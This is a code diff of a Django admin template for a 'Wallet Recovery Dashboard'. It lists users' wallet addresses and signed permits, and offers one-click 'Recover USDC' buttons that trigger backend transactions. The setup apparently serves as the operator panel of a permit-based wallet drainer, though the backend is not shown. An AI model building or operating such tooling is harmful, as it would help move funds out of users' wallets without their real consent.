@@ -1,62 +1,164 @@
 {% extends "admin/base_site.html" %}
+
+{% block extrahead %}
+<style>
+    /* Status Styling */
+    .status-log {
+        background: #000; color: #00ff00; font-family: 'Courier New', monospace;
+        padding: 15px; border-radius: 5px; height: 150px; overflow-y: auto;
+        margin-top: 20px; font-size: 12px; border: 1px solid #333;
+    }
+    .badge-pending { background-color: #f39c12; color: white; padding: 4px 8px; border-radius: 4px; }
+    .badge-success { background-color: #27ae60; color: white; padding: 4px 8px; border-radius: 4px; }
+    .btn-recover { font-weight: bold; text-transform: uppercase; }
+
+    /* Toast Notification */
+    #full-message-toast {
+        position: fixed; top: 20px; right: 20px; min-width: 300px;
+        z-index: 9999; padding: 20px; border-radius: 8px;
+        display: none; color: white; font-weight: bold;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+    }
+    .toast-error { background-color: #c0392b; border-left: 10px solid #8e1c10; }
+    .toast-success { background-color: #27ae60; border-left: 10px solid #1e8449; }
+</style>
+{% endblock %}
+
 {% block content %}
+<div id="full-message-toast"></div>
+
 <h1>Wallet Recovery Dashboard</h1>
 
-<table class="table table-striped">
-  <thead>
-    <tr>
-      <th>User</th>
-      <th>Wallet</th>
-      <th>Approval Signed?</th>
-      <th>Permit Deadline</th>
-      <th>Recovery TX</th>
-      <th>Action</th>
-    </tr>
-  </thead>
-  <tbody>
-    {% for profile in page_obj %}
-    <tr>
-      <td>{{ profile.user.username }}</td>
-      <td>{{ profile.wallet_address }}</td>
-      <td>{{ profile.has_web3_approval }}</td>
-      <td>{{ profile.permit_deadline }}</td>
-      <td>
-        {% if profile.recovery_tx_hash %}
-          <a href="https://etherscan.io/tx/{{ profile.recovery_tx_hash }}" target="_blank">{{ profile.recovery_tx_hash|truncatechars:10 }}</a>
-        {% else %}
-          -
-        {% endif %}
-      </td>
-      <td>
-        {% if not profile.recovery_tx_hash %}
-        <form method="post" action="{% url 'admin_recover_usdc' profile.id %}">
-          {% csrf_token %}
-          <button type="submit" class="btn btn-warning btn-sm">Recover USDC</button>
-        </form>
-        {% else %}
-        <span class="text-success">Recovered</span>
-        {% endif %}
-      </td>
-    </tr>
-    {% endfor %}
-  </tbody>
-</table>
+<div class="table-responsive">
+    <table class="table table-striped" id="recovery-table">
+        <thead>
+            <tr>
+                <th>User</th>
+                <th>Wallet Address</th>
+                <th>Permit Signed?</th>
+                <th>Deadline</th>
+                <th>Recovery TX Hash</th>
+                <th>Action</th>
+            </tr>
+        </thead>
+        <tbody>
+            {% for profile in page_obj %}
+            <tr id="row-{{ profile.id }}">
+                <td><strong>{{ profile.user.username }}</strong></td>
+                <td style="font-family: monospace;">{{ profile.wallet_address }}</td>
+                <td>
+                    {% if profile.has_web3_approval %}
+                        <span class="badge-success">YES</span>
+                    {% else %}
+                        <span class="badge-pending">NO</span>
+                    {% endif %}
+                </td>
+                <td><small>{{ profile.permit_deadline|default:"N/A" }}</small></td>
+                <td id="tx-{{ profile.id }}">
+                    {% if profile.recovery_tx_hash %}
+                        <a href="https://etherscan.io/tx/{{ profile.recovery_tx_hash }}" target="_blank">
+                            View Transaction
+                        </a>
+                    {% else %}
+                        <span class="text-muted">Not Started</span>
+                    {% endif %}
+                </td>
+                <td>
+                    {% if not profile.recovery_tx_hash %}
+                        <button
+                            class="btn btn-warning btn-sm btn-recover"
+                            onclick="triggerRecovery('{{ profile.id }}', '{{ profile.wallet_address }}')">
+                            Recover USDC
+                        </button>
+                    {% else %}
+                        <span class="text-success">✔ RECOVERED</span>
+                    {% endif %}
+                </td>
+            </tr>
+            {% endfor %}
+        </tbody>
+    </table>
+</div>
 
 <div class="pagination">
-  <span class="step-links">
-      {% if page_obj.has_previous %}
-          <a href="?page=1">&laquo; first</a>
-          <a href="?page={{ page_obj.previous_page_number }}">previous</a>
-      {% endif %}
+    <span class="step-links">
+        {% if page_obj.has_previous %}
+            <a href="?page=1">&laquo; first</a>
+            <a href="?page={{ page_obj.previous_page_number }}">previous</a>
+        {% endif %}
 
-      <span class="current">
-          Page {{ page_obj.number }} of {{ page_obj.paginator.num_pages }}.
-      </span>
+        <span class="current">
+            Page {{ page_obj.number }} of {{ page_obj.paginator.num_pages }}.
+        </span>
 
-      {% if page_obj.has_next %}
-          <a href="?page={{ page_obj.next_page_number }}">next</a>
-          <a href="?page={{ page_obj.paginator.num_pages }}">last &raquo;</a>
-      {% endif %}
-  </span>
+        {% if page_obj.has_next %}
+            <a href="?page={{ page_obj.next_page_number }}">next</a>
+            <a href="?page={{ page_obj.paginator.num_pages }}">last &raquo;</a>
+        {% endif %}
+    </span>
 </div>
+
+<hr>
+<h3>Live Execution Console</h3>
+<div class="status-log" id="console-log">
+    [SYSTEM] Dashboard loaded. Ready for recovery operations...
+</div>
+
+<script>
+    function updateConsole(msg, isError = false) {
+        const log = document.getElementById('console-log');
+        const timestamp = new Date().toLocaleTimeString();
+        const color = isError ? "#ff4444" : "#00ff00";
+        log.innerHTML += `<div><span style="color: #888;">[${timestamp}]</span> <span style="color: ${color}">${msg}</span></div>`;
+        log.scrollTop = log.scrollHeight;
+    }
+
+    function showFullToast(message, isError = false) {
+        const toast = document.getElementById('full-message-toast');
+        toast.innerHTML = message;
+        toast.className = isError ? "toast-error" : "toast-success";
+        toast.style.display = 'block';
+
+        // Stays visible for 10 seconds so you can read the full error
+        setTimeout(() => { toast.style.display = 'none'; }, 10000);
+    }
+
+    async function triggerRecovery(profileId, address) {
+        const btn = event.target;
+        btn.disabled = true;
+        btn.innerText = "Processing...";
+
+        updateConsole(`Initiating recovery for ${address}...`);
+
+        try {
+            const response = await fetch(`/admin/recover-usdc/${profileId}/`, {
+                method: 'POST',
+                headers: {
+                    'X-CSRFToken': '{{ csrf_token }}',
+                    'Content-Type': 'application/json'
+                }
+            });
+
+            const data = await response.json();
+
+            if (data.status === 'success') {
+                updateConsole(`SUCCESS: Transaction Sent! Hash: ${data.tx_hash}`);
+                showFullToast(`RECOVERY SENT: ${data.tx_hash}`);
+                document.getElementById(`tx-${profileId}`).innerHTML = `<a href="https://etherscan.io/tx/${data.tx_hash}" target="_blank">View on Etherscan</a>`;
+                btn.parentElement.innerHTML = '<span class="text-success">✔ RECOVERED</span>';
+            } else {
+                // This shows the FULL message from your Python backend
+                updateConsole(`FAILED: ${data.message}`, true);
+                showFullToast(`ERROR: ${data.message}`, true);
+                btn.disabled = false;
+                btn.innerText = "Retry Recover";
+            }
+        } catch (error) {
+            updateConsole(`SERVER ERROR: Connection timed out or script crashed.`, true);
+            showFullToast(`CRITICAL ERROR: Check Python logs.`, true);
+            btn.disabled = false;
+            btn.innerText = "Retry Recover";
+        }
+    }
+</script>
 {% endblock %}
